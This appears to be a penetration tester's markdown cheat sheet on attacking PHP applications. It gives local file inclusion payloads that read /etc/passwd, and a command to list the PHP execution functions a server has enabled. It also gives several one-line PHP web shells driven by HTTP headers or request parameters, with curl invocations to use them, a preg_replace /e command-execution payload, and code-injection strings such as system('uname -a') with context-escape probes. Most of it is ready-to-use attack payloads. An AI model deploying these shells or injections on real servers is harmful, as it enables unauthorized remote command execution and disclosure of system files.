PHP


## Check for registered php stream

- with a lfi you can do some tricks : example :`configfile=../../../../../../../etc/passwd`

- You may need to add %00 at the end.

- if file is allowed : ```=file:///etc/passwd```

data, php ...

https://dzone.com/articles/the-powerful-resource-of-php-stream-wrappers

---

## Function

- Could be helpful : ```system```, ```shell_exec```

- Know which are enabled : ```php -r 'print_r(get_defined_functions());' | grep -E ' (system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)'<?php print_r(get_defined_functions()); ?>```

---

## Execute command :

1.
```
<?php $_SERVER['HTTP_LANG']($_SERVER['HTTP_ACCEPT-LANGUAGE']); ?>

curl -H "Lang: system" -H "Accept-Language: <cmd>" ...
```

2. 
```
<?php system($_SERVER['HTTP_LANG']); ?>
curl -H "Lang: <cmd>"...
```

3.
```
<?php system($_GET['cmd']);?>
http://url/fichier/?cmd=
```

4.
```
<?php system($_REQUEST['cmd']); ?>

file.php&cmd=whoami
```

5. The only limitation is your brain. Try hard !

https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/


---

## Preg_replace :

Experimenting with the functionality of the VPNGenerator, it is easy  to spot what it does. A placeholder string in the VPN generator window  is substituted for a custom input via preg_replace() php function. Older implementations of preg_replace() are vulnerable to a remote command execution using /e  specifier if you know how to approach it! I suggest doing your own  research on the function if you are unfamiliar with php. Here are some  links to help you:
  • https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
  • http://www.madirish.net/402
  • http://php.net/manual/en/function.preg-replace.php
 
 `preg_replace(/x/e, system("id"), x)`
 ---
 
## Bypass disable_functions

  https://0xdf.gitlab.io/2019/08/02/bypassing-php-disable_functions-with-chankro.html
  
  https://0xdf.gitlab.io/2021/01/23/htb-compromised.html
  

---

## Code execution

- Comments : In PHP, you can use `//` to get rid of the code added by the application.

- As SQL injection, you can use the same technique to test and ensure you have a code injection:

	- Using comments and injecting: `/* <random value> */`, `<command>;#`, `".<command>;//.`
	- Injecting a simple concatenation `"."` (`"` used to break the syntax and reform it correctly).
	- Replacing the parameter you provided by a string concatenation: `"."th"."is"."` instead of `this`.
	- add code : `$test=".`

- You can also use time-based detection for this issue by using the PHP function sleep. You will see a time difference between:

	- Calling the function sleep or calling it with a delay of zero: `sleep(0)`.
	- A call to the function with a long delay: `sleep(10)`.

Examples : 

- By adding some code: `".system('uname -a'); $dummy="`
- By using comment: `".system('uname -a');#` or `".system('uname -a');//`
- `'.'`, if it works, try adding some function : `'.phpinfo().'`
- Don't forget to url encode if necessary.

Use the error message to understand how you can exit the context (what should I do to end it ? `; ) } // ' " +`). Examples : 

`?order=id;}//:` we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
`?order=id);}//:` we get a warning. That seems about right.
`?order=id));}//:` we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.


